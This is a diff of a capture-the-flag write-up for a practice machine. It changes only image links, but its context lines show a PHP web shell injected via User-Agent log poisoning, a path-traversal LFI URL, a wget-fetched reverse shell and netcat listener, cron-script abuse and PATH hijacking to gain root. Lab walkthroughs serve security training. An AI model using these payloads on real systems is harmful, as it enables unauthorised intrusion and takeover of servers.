@@ -84,22 +84,22 @@ Now, given the LFI vulnerability, if we can successfully access the log, we can 
 Now it's time to fire up BurpSuite.
 We'll put the php shell in the User-Agent string:
 `<?php echo system($_GET['cmd']); ?>`
-![[Pasted image 20251031181329.png]]
+![](https://github.com/user-attachments/assets/2cf45042-de12-4575-aba6-f3416c552bbc)
 
 And we'll try if it's working by injecting `&cmd=whoami` in the URL:
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami`
 
 Now we have code execution.
 We can use it to upload a php reverse shell (`shell.php`) using wget and URL encoding the space, immediately after opening the server.
-![[Pasted image 20251031184003.png]]
+![](https://github.com/user-attachments/assets/c8d81dca-ab7c-431d-a3c8-ddf81e64d3d5)
 
 
-![[Pasted image 20251031184309.png]]
+![](https://github.com/user-attachments/assets/9d29b928-f84a-4f22-8ef5-000ec4634757)
 
 
 
 It's time to fire up netcat and visit `mafialive.thm/shell.php`
-![[Pasted image 20251031184847.png]]
+![](https://github.com/user-attachments/assets/73bd663a-6950-40c9-aa21-590e9f6c3166)
 And...we're in!
 `whoami: 
 `www-data`
@@ -108,18 +108,18 @@ And...we're in!
 Let's stabilize the shell:
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 `export TERM=xterm-color`
-![[Pasted image 20251101143751.png]]
+![](https://github.com/user-attachments/assets/0eaeae04-1ab0-4ddb-8edc-49a11dbf3061)
 Now we're ready to search for the third flag, the one of the first user (www-data).
 
 
 
 Let's do some cron enumeration:
 ` cat /etc/crontab`
-![[Pasted image 20251101144910.png]]
+![](https://github.com/user-attachments/assets/15739c46-68df-46d2-ae9e-fa7927e3652f)
 
 We can see that there's a helloworld.sh file that's been executed every minute as root.
 If we `ls -la` the file we can see we have write permission on it.
-![[Pasted image 20251101145421.png]]
+![](https://github.com/user-attachments/assets/84a87ca2-d266-4653-af04-5d313c3a8d4d)
 
 
 
@@ -128,7 +128,7 @@ We will echo this one liner into the file and wait for the execution by root:
 (Activate netcat in another terminal on port 4445)
 And obviously, we will stabilize the shell again
 and search for the flag of the user archangel.
-![[Pasted image 20251101154203.png]]
+![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)
 
 
 
@@ -154,8 +154,8 @@ Put this folder first into the PATH environment variables:
 Execute the command:
 ./backup
 
-![[Pasted image 20251101160725.png]]
+![](https://github.com/user-attachments/assets/ee3846c6-f848-43c4-8d29-414418c82a61)
 
-Congratulations! You are now root :)
+Congratulations! Now you are root :)
 
 
